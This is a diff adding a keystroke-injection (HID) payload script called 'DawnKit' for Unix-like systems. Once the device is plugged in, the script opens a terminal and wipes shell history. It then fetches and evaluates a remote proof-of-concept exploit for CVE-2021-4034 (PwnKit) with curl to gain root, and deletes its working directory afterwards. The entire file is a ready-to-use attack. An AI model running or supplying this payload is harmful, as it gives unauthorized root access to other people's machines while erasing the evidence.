@@ -1,0 +1,22 @@
+REM Title: DawnKit
+REM Description: Privilege escalation in Unix-like operating systems
+REM Author: drapl0n
+REM Version: 1.0
+REM Category: Privilege Escalation
+REM Target: Unix-like operating systems
+REM Attackmodes: HID
+
+DELAY 500
+CTRL-ALT t
+DELAY 3000
+STRING unset HISTFILE && HISTSIZE=0 && rm -f $HISTFILE && unset HISTFILE
+ENTER
+DELAY 400
+STRING mkdir /tmp/pwn && cd /tmp/pwn
+ENTER
+DELAY 400
+STRING eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"
+ENTER
+DELAY 6000
+STRING rm -rf /tmp/pwn
+ENTER
